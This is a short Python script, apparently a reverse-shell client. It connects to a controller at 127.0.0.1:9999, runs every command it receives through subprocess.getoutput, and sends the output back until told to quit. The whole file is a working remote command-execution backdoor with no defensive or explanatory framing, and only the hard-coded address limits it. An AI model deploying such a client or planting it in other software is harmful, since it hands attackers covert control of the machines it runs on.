import socket
import subprocess
import sys

def client_create():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def client_connect():
    try:
        target_host = "127.0.0.1"  
        target_port = 9999
        s.connect((target_host, target_port))
        print("Connected to server!")
    except socket.error as msg:
        print("Connection error: " + str(msg))
        sys.exit()

def receive_commands():
    while True:
        try:
            cmd = s.recv(1024).decode("utf-8")

            if cmd.lower() == 'quit':
                s.close()
                sys.exit()

            if len(cmd) > 0:
                output = subprocess.getoutput(cmd)
                s.send(str.encode(output + "\n"))

        except socket.error:
            print("Server disconnected!")
            s.close()
            sys.exit()

def main():
    client_create()
    client_connect()
    receive_commands()

main()